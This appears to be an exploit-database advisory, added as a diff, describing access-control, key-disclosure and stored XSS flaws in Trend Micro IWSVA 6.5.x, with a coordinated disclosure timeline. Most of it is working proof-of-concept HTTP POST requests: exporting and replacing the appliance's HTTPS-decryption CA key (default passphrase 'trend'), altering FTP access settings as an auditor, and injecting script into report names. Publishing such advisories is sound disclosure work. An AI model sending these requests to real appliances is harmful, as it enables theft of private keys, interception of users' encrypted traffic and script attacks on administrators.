@@ -1,0 +1,275 @@
+# Exploit Title: [Trend Micro Interscan Web Security Virtual Appliance (IWSVA) 6.5.x Multiple Vulnerabilities]
+# Date: [12/01/2017]
+# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
+# Vendor Homepage: [http://www.trendmicro.com/us/enterprise/network-security/interscan-web-security/virtual-appliance/]
+# Version: [Tested on  IWSVA 6.5-SP2 Critical Patch Build 1739 and prior versions in 6.5.x series. Older versions may also be affected]
+# Tested on: [IWSVA 6.5-SP2 Critical Patch Build 1739]
+# CVE : [CVE-2017-6338,CVE-2017-6339,CVE-2017-6340]
+# Vendor Security Bulletin: https://success.trendmicro.com/solution/1116960
+
+==================
+#Product:-
+==================
+Trend Micro ‘InterScan Web Security Virtual Appliance (IWSVA)’ is a secure web gateway that combines application control with zero-day exploit detection, advanced anti-malware and ransomware scanning, real-time web reputation, and flexible URL filtering to provide superior Internet threat protection.
+
+==================
+#Vulnerabilities:-
+==================
+Multiple Incorrect Access Control,Stored Cross Site Scripting, and Sensitive Information Disclosure vulnerabilities
+
+========================
+#Vulnerability Details:-
+========================
+
+=============================================================================================================================
+Sensitive Information Disclosure Vulnerability (CVE-2017-6339):-
+=============================================================================================================================
+
+Per IWSVA documentation, by default, IWSVA acts as a private Certificate Authority (CA) and dynamically generates digital certificates that are sent to client browsers to complete a secure passage for HTTPS connections. It also allows administrators to upload their own certificates signed by root CA. An attacker with low privileges can download current CA certificate and Private Key (either the default ones or uploaded by administrators) and use those to decrypt HTTPS traffic thus compromising confidentiality.
+Also, the default Private Key on this appliance is encrypted with very weak and guessable passphrase ‘trend’. If an appliance uses default Certificate and Private Key provided by Trend Micro, an attacker can simply download these and decrypt the Private Key using default passphrase ‘trend’.
+
+#Proof-of-Concept:
+
+1. Log into IWSVA web console with least privilege user.
+2. Send following POST requests:
+
+Request#1: Download 'get_current_ca_cert.cer'
+
+POST /servlet/com.trend.iwss.gui.servlet.XMLRPCcert?action=exportcert HTTP/1.1 
+Host: 192.168.253.150:1812 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Cookie: JSESSIONID=<SessionID>
+Connection: close 
+Upgrade-Insecure-Requests: 1 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 147 
+
+CSRFGuardToken=<Token>&op=save&defaultca=no&importca_certificate=&importca_key=&importca_passphrase=&importca_2passphrase=
+
+
+Request#2: Download 'get_current_ca_key.cer'
+
+POST /servlet/com.trend.iwss.gui.servlet.XMLRPCcert?action=exportkey HTTP/1.1
+Host: 192.168.253.150:1812 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Cookie: JSESSIONID=<SessionID> 
+Connection: close 
+Upgrade-Insecure-Requests: 1 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 147 
+
+CSRFGuardToken=<Token>&op=save&defaultca=no&importca_certificate=&importca_key=&importca_passphrase=&importca_2passphrase=
+
+3.Decrypt the Private Key using passphrase ‘trend’.
+
+
+=============================================================================================================================
+Multiple Incorrect Access Control Vulnerabilities (CVE-2017-6338):
+=============================================================================================================================
+
+#1. Missing functional level access control allows a low privileged user upload HTTPS Decryption Certificate and Private Key:
+-----------------------------------------------------------------------------------------------------------------------------
+
+Per IWSVA documentation, by default, IWSVA acts as a private Certificate Authority (CA) and dynamically generates digital certificates that are sent to client browsers to complete a secure passage for HTTPS connections. It also allows administrators to upload their own certificates signed by root CA.
+An attacker with low privileges can upload new CA certificate and Private Key and use those to decrypt HTTPS traffic thus compromising confidentiality.
+
+#Proof-of-Concept:
+
+1. Log into IWSVA web console with least privilege user ‘Test2’.
+2. Send following POST request:
+
+Request#1:
+
+POST /servlet/com.trend.iwss.gui.servlet.XMLRPCcert?action=import HTTP/1.1
+Accept: text/html, application/xhtml+xml, image/jxr, */*
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
+Content-Type: multipart/form-data; boundary=---------------------------7e11fd2fd0ac0
+Accept-Encoding: gzip, deflate
+Content-Length: 4085
+Host: 192.168.253.150:1812
+Pragma: no-cache
+Cookie: JSESSIONID=E595855EF5900782921945280ABA46CD
+Connection: close
+
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="CSRFGuardToken"
+
+S8PM5QG974XLWS992MCK5M67T6D0A575
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="op"
+
+save
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="defaultca"
+no
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="importca_certificate"; filename="get_current_ca_cert(2).cer"
+Content-Type: application/x-x509-ca-cert
+
+-----BEGIN CERTIFICATE-----
+	---snip---
+-----END CERTIFICATE-----
+
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="importca_key"; filename="get_current_ca_key(1).cer"
+Content-Type: application/x-x509-ca-cert
+
+-----BEGIN RSA PRIVATE KEY-----
+	---snip---
+-----END RSA PRIVATE KEY-----
+
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="importca_passphrase"
+
+trend
+-----------------------------7e11fd2fd0ac0
+Content-Disposition: form-data; name="importca_2passphrase"
+
+trend
+-----------------------------7e11fd2fd0ac0--
+
+3. Above request will delete/remove existing certificates and add new one. To confirm if the certificate and private key were uploaded successfully, log in with Administrator account and download the certificate/key. These should be the ones that you uploaded.
+
+
+#2. Missing functional level access control allows an authenticated user change FTP access control setting
+-----------------------------------------------------------------------------------------------------------------------------
+An attacker with read only rights can change ‘FTP Access Control Settings’ by sending a specially crafted POST request.
+
+#Proof-of-Concept:
+
+1.Log into IWSVA web console with least privilege user ‘Auditor’.
+2.Send following POST request:
+
+Request#1:
+
+POST /ftp_clientip.jsp HTTP/1.1
+Host: 192.168.253.150:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.253.150:1812/ftp_clientip.jsp
+Cookie: JSESSIONID=<SessionID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 250
+	
+CSRFGuardToken=<Token>&op=save&change_op=nochanged&daemonaction=8&input_tips=40+characters+maximum&ftp__use_client_acl=yes&use_client_acl_view=yes&inputtype=ip&ip=192.168.253.133&desc=Ubuntu&itemlist=192.168.253.133+%3BUbuntu
+
+3. This enables FTP access.
+4. Log into IWSVA web console as admin from another browser and check to see if FTP Access Control List has been updated.
+
+
+
+#3. Missing functional level access control allows an Auditor user create/modify reports
+-----------------------------------------------------------------------------------------------------------------------------
+An authenticated, remote attacker with ‘Auditor’ role assigned to him/her, can modify existing reports or create a new one. This user can also exploit the stored cross-site scripting vulnerability mentioned above.
+
+#Proof-of-Concept:
+
+1. Log into IWSVA web console with least privilege user ‘Auditor’.
+2. Send following POST requests:
+
+
+Request#1:
+
+POST /rest/commonlog/report/template HTTP/1.1
+Host: 192.168.253.150:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.253.150:1812/report_action.jsp?CSRFGuardToken=<Token>&mode=add
+Content-Length: 92
+Cookie: JSESSIONID=<SessionID>
+Connection: close
+
+{"action":"check_name","name":"AuditorsReport\<script\>alert(\"Hola Auditor!\")\</script\>"}
+
+
+Request#2:
+
+POST /rest/commonlog/report/template HTTP/1.1
+Host: 192.168.253.150:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.253.150:1812/report_action.jsp?CSRFGuardToken=<Token>&mode=add
+Content-Length: 2877
+Cookie: JSESSIONID=<SessionID>
+Connection: close
+
+{"action":"add","template":{"reports":{"internet_security":[["top_malware_spyware_detection",10,true,[0]],["top_botnet_detection",10,true,[0]],["top_advanced_threats_detection",10,true,[0]],["top_custom_defense_apt_blocking",10,true,[0]],["c&c_contact_alert_count_by_date",0,true,[0]],["top_c&c_contact_ip_domains",10,true,[0]],["top_users_hosts_detected_by_c&c_contact_alert",10,true,[0]],["top_groups_detected_by_c&c_contact_alert",10,true,[0]],["top_malicious_sites_blocked",10,true,[0]],["top_users_blocked_by_malware_spyware",10,true,[0]],["top_users_blocked_by_malicious_sites",10,true,[0]],["top_groups_blocked_by_malware_spyware",10,true,[0]],["top_groups_blocked_by_malicious_site",10,true,[0]],["top_users_by_bot_net_detection",10,true,[0]],["most_violation_for_http_malware_scan_policy",0,true,[0]],["malicious_sites_blocked_by_date",0,true,[2]],["malware_spyware_detection_by_date",0,true,[2]],["malware_spyware_detection_trend",0,true,[3]]],"internet_access":[["top_applications_visited",10,true,[0]],["top_url_categories_visited",10,true,[0]],["top_sites_visited",10,true,[0]],["top_users_by_requests",10,true,[0]],["top_groups_by_requests",10,true,[0]],["top_url_categories_by_browse_time",10,true,[0]],["top_sites_visited_by_browse_time",10,true,[0]],["top_users_by_browse_time",10,true,[0]],["activity_level_by_days",0,true,[5]]],"bandwidth":[["top_url_categories_by_bandwidth",10,true,[0]],["top_applications_by_bandwidth",10,true,[0]],["top_users_by_bandwidth",10,true,[0]],["top_groups_by_bandwidth",10,true,[0]],["top_sites_by_bandwidth",10,true,[0]],["total_traffic_by_days",0,true,[3]]],"policy_enforcement":[["top_url_categories_blocked",10,true,[0]],["top_applications_blocked",10,true,[0]],["top_users_enforced",10,true,[0]],["top_groups_enforced",10,true,[0]],["top_sites_blocked",10,true,[0]],["top_users_by_http_inspection",10,true,[0]],["most_violation_for_url_filtering_policy",0,true,[0]],["most_violation_for_application_control_policy",0,true,[0]],["most_violation_for_access_quota_control_policy",0,true,[0]],["most_violation_for_applets_and_activex_policy",0,true,[0]],["most_violation_for_http_inspection_policy",0,true,[0]]],"data_security":[["top_dlp_templates_blocked_by_requests",10,true,[2]],["top_blocked_users",10,true,[0]],["top_blocked_groups",10,true,[0]],["most_violation_for_data_loss_prevention_policy",0,true,[0]]],"custom_reports":[]},"mail_to":[""],"fail_mail_to":""],"description":"","name":"AuditorsReport,"enable":true,"frequency":0,"scheduled":false,"start_date":1484170920,"runtime":"0:3:12","max_exec_number":0,"period":"1D","from":1484159400,"to":1484245800,"scheduled_time_filter":"0","device_group":"","type":"PDF","list_number":10,"mail_enable":false,"mail_from":"","subject":"","message":"","mail_attach":false,"fail_notice":false,"report_by":0,"report_by_list":{}}}
+
+
+
+=============================================================================================================================
+Stored Cross Site Scripting (CVE-2017-6340):
+=============================================================================================================================
+An authenticated, remote attacker can inject a Java script while creating a new report that results in a stored cross-site scripting attack.
+
+#Proof-of-Concept:
+
+1. Log into IWSVA web console with least privilege user ‘Auditor’.
+2. Send following POST requests:
+
+Request#1:
+
+POST /rest/commonlog/report/template HTTP/1.1
+Host: 192.168.253.150:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.253.150:1812/report_action.jsp?CSRFGuardToken=EPCB6FAIRAK4393A74A9SYCRKR2C6VZM&mode=edit&tid=19b59380-4a41-4134-81af-f7e2e6ce06d9
+Content-Length: 88
+Cookie: JSESSIONID=5F8A705062C1D9C14B0026F8C89D5CC8
+Connection: close
+
+{"action":"check_name","name":"TestReport1\<script\>alert(\"Hola Report!\")\</script\>"}
+
+Request#2:
+
+POST /rest/commonlog/report/template HTTP/1.1
+Host: 192.168.253.150:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.253.150:1812/report_action.jsp?CSRFGuardToken=EPCB6FAIRAK4393A74A9SYCRKR2C6VZM&mode=edit&tid=19b59380-4a41-4134-81af-f7e2e6ce06d9
+Content-Length: 3041
+Cookie: JSESSIONID=5F8A705062C1D9C14B0026F8C89D5CC8
+Connection: close
+
+{"action":"modify","tid":"19b59380-4a41-4134-81af-f7e2e6ce06d9","template":{"tid":"19b59380-4a41-4134-81af-f7e2e6ce06d9","name":"TestReport1\<script\>alert(\"Hola Report!\")\</script\>","description":"","enable":true,"period":"1D","from":-2209096400,"to":-2209096400,"frequency":0,"scheduled":false,"start_date":1481060520,"runtime":"0:0:0","max_exec_number":0,"type":"PDF","list_number":10,"mail_enable":false,"mail_from":"","mail_to":[""],"subject":"","message":"","mail_attach":false,"fail_notice":false,"fail_mail_to":[""],"report_by":0,"report_by_list":{},"reports":{"internet_security":[["top_malware_spyware_detection",10,true,[0]],["top_botnet_detection",10,true,[0]],["top_advanced_threats_detection",10,true,[0]],["top_custom_defense_apt_blocking",10,true,[0]],["c&c_contact_alert_count_by_date",0,true,[0]],["top_c&c_contact_ip_domains",10,true,[0]],["top_users_hosts_detected_by_c&c_contact_alert",10,true,[0]],["top_groups_detected_by_c&c_contact_alert",10,true,[0]],["top_malicious_sites_blocked",10,true,[0]],["top_users_blocked_by_malware_spyware",10,true,[0]],["top_users_blocked_by_malicious_sites",10,true,[0]],["top_groups_blocked_by_malware_spyware",10,true,[0]],["top_groups_blocked_by_malicious_site",10,true,[0]],["top_users_by_bot_net_detection",10,true,[0]],["most_violation_for_http_malware_scan_policy",0,true,[0]],["malicious_sites_blocked_by_date",0,true,[2]],["malware_spyware_detection_by_date",0,true,[2]],["malware_spyware_detection_trend",0,true,[3]]],"internet_access":[["top_applications_visited",10,true,[0]],["top_url_categories_visited",10,true,[0]],["top_sites_visited",10,true,[0]],["top_users_by_requests",10,true,[0]],["top_groups_by_requests",10,true,[0]],["top_url_categories_by_browse_time",10,true,[0]],["top_sites_visited_by_browse_time",10,true,[0]],["top_users_by_browse_time",10,true,[0]],["activity_level_by_days",0,true,[5]]],"bandwidth":[["top_url_categories_by_bandwidth",10,true,[0]],["top_applications_by_bandwidth",10,true,[0]],["top_users_by_bandwidth",10,true,[0]],["top_groups_by_bandwidth",10,true,[0]],["top_sites_by_bandwidth",10,true,[0]],["total_traffic_by_days",0,true,[3]]],"policy_enforcement":[["top_url_categories_blocked",10,true,[0]],["top_applications_blocked",10,true,[0]],["top_users_enforced",10,true,[0]],["top_groups_enforced",10,true,[0]],["top_sites_blocked",10,true,[0]],["top_users_by_http_inspection",10,true,[0]],["most_violation_for_url_filtering_policy",0,true,[0]],["most_violation_for_application_control_policy",0,true,[0]],["most_violation_for_access_quota_control_policy",0,true,[0]],["most_violation_for_applets_and_activex_policy",0,true,[0]],["most_violation_for_http_inspection_policy",0,true,[0]]],"data_security":[["top_dlp_templates_blocked_by_requests",10,true,[2]],["top_blocked_users",10,true,[0]],["top_blocked_groups",10,true,[0]],["most_violation_for_data_loss_prevention_policy",0,true,[0]]],"custom_reports":[]},"last_gen_time":1481103598,"current_exec_time":1,"scheduled_time_filter":"0","device_group":"","last_update_by":"test2"}}
+
+3.Any user visiting 'reports.jsp' and 'show_auditlog.jsp' pages will see the alert.
+
+
+===================================
+#Vulnerability Disclosure Timeline:
+===================================
+
+15/02/2017: First email to disclose the vulnerability to the Trend Micro incident response team
+20/02/2017: Second email to ask for acknowledgment
+23/02/2017: Third email to ask for acknowledgment
+25/02/2017  Vendor confirms vulnerabilities stating that the fix is being worked on.
+27/02/2017: Mitre assigned CVE-2017-6338, CVE-2017-6339 and CVE-2017-6340 to these vulnerabilities
+14/03/2017: Vendor confirms that the final release date would be disclosed soon.
+28/03/2017: Vendor released security advisory: https://success.trendmicro.com/solution/1116960
